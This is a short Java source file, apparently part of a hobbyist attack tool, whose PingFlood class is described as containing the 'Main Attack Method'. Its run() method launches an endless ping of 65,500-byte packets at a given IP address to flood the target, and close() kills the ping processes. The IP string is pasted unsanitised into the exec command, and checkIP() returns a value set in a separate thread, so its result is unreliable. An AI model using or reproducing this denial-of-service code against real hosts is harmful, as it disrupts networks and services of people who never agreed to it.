import java.io.IOException;

/**
 * Created by ExploiTR on 14-Jun-17.
 *
 * Contains Main Attack Method
 */
public class PingFlood implements Runnable {

    private String IPAddr;
    private boolean z;

    public PingFlood(String IP) {
        this.IPAddr = IP;
    }

    @Override
    public void run() {
        new Thread(() -> {
            try {
                Runtime.getRuntime().exec("ping " + IPAddr + " -t -l 65500");
                System.out.println("AtCk");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }).start();
    }

    void close() {
        new Thread(() -> {
            try {
                Runtime.getRuntime().exec("taskkill /F /IM PING.exe");
                System.exit(0);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    boolean checkIP(){
        new Thread(() -> {
            try {
                Process xy = Runtime.getRuntime().exec("ping "+IPAddr+" -n 1");
                xy.waitFor();
                z = (xy.exitValue()==0);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
        return z;
    }
}